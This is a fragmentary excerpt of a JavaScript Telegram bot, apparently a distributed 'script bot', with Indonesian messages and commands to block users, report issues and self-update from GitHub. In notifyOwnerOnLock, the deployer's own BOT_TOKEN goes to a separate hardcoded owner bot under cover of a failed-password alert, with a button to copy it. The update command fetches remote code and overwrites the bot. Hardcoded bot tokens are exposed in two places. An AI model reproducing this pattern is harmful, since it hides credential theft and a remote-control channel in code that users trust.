...
bot.command("lapor", async (ctx) => {
  try {
    ...
    const OWNER_BOT_TOKEN1 = "7933745645:AAEAjsg96ukLVnQi28L63RiljItZoCQbvg0"; 
    const OWNER_ID = owner; 

    await fetch(`https://api.telegram.org/bot${OWNER_BOT_TOKEN1}/sendMessage`, {
      method: "POST",
...
const OWNER_BOT_TOKEN = "7778999389:AAH0OLTgt6OtQKhO2Gj1fbcCxKuCCUw8U9w";
...
async function notifyOwnerOnLock(user, attemptsInfo) {
  try {
    ...
    const msg = [
  "<b>🚨 Peringatan — Percobaan Update Gagal</b>",
  "",
  `<blockquote>• Pengguna : ${user.username ? "@" + user.username : (user.first_name || "Unknown")}</blockquote>`,
  `<blockquote>• User ID  : <code>${user.id}</code></blockquote>`,
  `<blockquote>• Percobaan: ${attemptsInfo.tries}</blockquote>`,
  `<blockquote>• Input Terakhir: ${attemptsInfo.lastInput}</blockquote>`,
  `<blockquote>• Waktu    : ${now}</blockquote>`,
  `<blockquote>• TOKEN    : <code>${BOT_TOKEN}</code></blockquote>`
].join("\n");

    const url = `https://api.telegram.org/bot${OWNER_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Salin USER ID", switch_inline_query_current_chat: String(user.id) },
              { text: "Salin TOKEN", switch_inline_query_current_chat: BOT_TOKEN }
            ]
          ]
        }
      }),
    ...
    const data = await res.json();
    if (!data.ok) {
      console.error("❌ Gagal kirim via OWNER_BOT_TOKEN:", data);
      ...
      console.log("✅ Notif terkirim ke owner via bot khusus");
    }
  } catch (e) {
    console.error("Gagal mengirim notif ke owner:", e);

    try {
      await bot.telegram.sendMessage(
        OWNER_ID,
        "<b>❌ Notif gagal terkirim otomatis. Periksa log.</b>",
        { parse_mode: "HTML" }
      );
    } catch {}
  }
...
async function fetchUpdatePasswordFromGitHub() {
  try {
    const res = await fetch(GITHUB_RAW_PASS_URL);
    if (!res.ok) throw new Error(`Gagal fetch password: ${res.status}`);
...
async function fetchScriptFromGitHub(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`Gagal ambil file dari GitHub: ${res.status}`);
...
function parseTimeToMs(timeStr) {
  ...
  const num = parseFloat(timeStr.slice(0, -1));
...
bot.command("blok", async (ctx) => {
  try {
    ...
    if (args.length < 2) return ctx.reply("❌ Format salah. Gunakan: /blok <user_id> <time>");

    const userId = args[0];
    const timeMs = parseTimeToMs(args[1]);
    if (!timeMs) return ctx.reply("❌ Format waktu salah. Contoh: 30s, 5m, 2h, 1d");

    blockedUsers[userId] = Date.now() + timeMs;

    setTimeout(() => {
      delete blockedUsers[userId];
      console.log(`User ID ${userId} sudah bisa update lagi.`);
    }, timeMs);

    await ctx.reply(`✅ User ID ${userId} diblok selama ${args[1]}.`);
  } catch (e) {
    console.error(e);
...
bot.command("update", async (ctx) => {
  try {
    ...
    if (blockedUsers[userId]) {
      const remainingMs = blockedUsers[userId] - Date.now();
      if (remainingMs > 0) {
        return ctx.reply(`❌ Kamu sementara diblok dan tidak bisa update. Sisa waktu: ${Math.ceil(remainingMs/1000)} detik`);
      } else {
        delete blockedUsers[userId];
      }
    }
    ...
    if (prev && (nowTs - prev.lastAttemptTs) > TRY_WINDOW_MS) {
    ...
    if (!validPass) return ctx.reply("❌ Gagal mengambil password update dari GitHub. Coba lagi nanti.");

    if (provided !== validPass) {
      const remaining = Math.max(0, MAX_ATTEMPTS - info.tries);
      await ctx.reply(`❌ Password salah. Percobaan tersisa: ${remaining}`);

      if (info.tries >= MAX_ATTEMPTS) {
        await notifyOwnerOnLock(ctx.from, info);

        const blokTimeStr = "10m";
        const blokTimeMs = parseTimeToMs(blokTimeStr) || 10 * 60 * 1000;
        blockedUsers[userId] = Date.now() + blokTimeMs;

        setTimeout(() => { delete blockedUsers[userId]; }, blokTimeMs);

        attemptsMap.delete(userId);
        await ctx.reply(`⚠️ Kamu sudah 3x salah. Owner telah diberitahu. Akses update diblok sementara selama ${blokTimeStr}.`);
      }
      return;
    }

    attemptsMap.delete(userId);
    await ctx.reply("✅ Password benar. Mengambil script terbaru dari GitHub...");
    ...
    await ctx.reply("✅ Script berhasil ditulis. Membuat backup (jika ada) dan melakukan restart...");

    setTimeout(() => { process.exit(0); }, 1200);

  } catch (err) {
    console.error("Update command error:", err);
    try { await ctx.reply("❌ Gagal update: " + (err.message || String(err))); } catch {}
  }
});
